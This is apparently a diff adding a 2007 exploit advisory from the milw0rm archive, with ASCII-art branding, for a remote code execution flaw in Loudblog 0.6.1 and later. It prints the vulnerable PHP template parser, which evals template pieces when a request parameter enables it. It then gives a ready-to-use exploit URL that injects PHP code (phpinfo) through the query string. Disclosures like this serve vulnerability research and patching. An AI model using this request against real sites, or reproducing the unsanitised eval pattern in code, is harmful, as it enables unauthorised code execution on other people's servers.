@@ -1,0 +1,42 @@
+----[ Loudblog Remote Code Execution ... ITDefence.ru Antichat.ru ]
+
+							Loudblog >= 0.6.1 Remote Code Execution
+							Eugene Minaev underwater@itdefence.ru
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+			
+		Template parser function
+		
+		<?php
+		
+		$parsedpage = fullparse(firstparse(hrefmagic($template)));
+
+		//do we have php code within our template? switch between echo and eval!
+		if ($php_use) {
+		$templatepieces = explode ($phpseparator, $parsedpage);
+		for ($i = 0; $i <= count($templatepieces); $i += 2) {
+		echo $templatepieces[$i];
+		if (isset($templatepieces[$i+1])) eval ($templatepieces[$i+1]);
+		}
+		//no php code, no eval!
+		} else {
+		echo $parsedpage;
+		}  
+		
+		?>
+		
+		loudblog/inc/parse_old.php?template=@phpinfo();@&php_use=1&phpseparator=@&parsedpage=@phpinfo();@
+		
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-06]
